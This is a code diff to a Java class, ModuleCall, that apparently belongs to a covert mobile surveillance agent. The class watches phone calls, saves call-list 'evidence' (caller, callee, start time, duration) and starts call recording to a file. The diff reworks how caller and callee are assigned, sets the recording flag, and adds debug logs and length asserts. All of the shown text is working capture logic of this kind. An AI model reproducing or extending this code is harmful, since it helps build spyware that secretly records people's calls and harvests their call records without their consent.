@@ -133,15 +133,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (notification): Saving CallList evidence"); //$NON-NLS-1$
 			}
 
-			String from, to;
-			String local = Device.self().getPhoneNumber();
-			if (incoming) {
-				from = call.getNumber();
-				to = local;
-			} else {
-				from = local;
-				to = call.getNumber();
-			}
+			String from = call.getFrom();
+			String to = call.getTo();
+
 			saveCalllistEvidence(CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.getDuration());
 		}
 
@@ -199,7 +193,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
 			}
 
-		}else{
+		} else {
 			recordFlag = false;
 		}
 
@@ -300,8 +294,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		byte[] caller;
 		byte[] callee;
 
-		caller = WChar.getBytes("local");
-		callee = WChar.getBytes(number);
+		if (incoming) {
+			callee = WChar.getBytes("local"); //Device.self().getPhoneNumber());
+			caller = WChar.getBytes(number);
+		} else {
+			caller = WChar.getBytes("local"); //Device.self().getPhoneNumber());
+			callee = WChar.getBytes(number);
+		}
 
 		final int version = 2008121901; // CALL_LOG_VERSION
 		final int program = 0x0145; // LOGTYPE_CALL_MOBILE
@@ -325,6 +324,16 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		additionalData.write(caller);
 		additionalData.write(callee);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
+			Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition() , len);
+		}
+
+		if (Cfg.DEBUG) {
+			Check.asserts(additionalData.getPosition() == len, " (getCallAdditionalData) Assert failed, wrong len: "
+					+ additionalData.getPosition() + ", wanted len:" + len);
+		}
 
 		return additionaldata;
 	}
@@ -418,6 +427,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 		}
 
+		recordFlag = supported;
 		return supported;
 	}
 
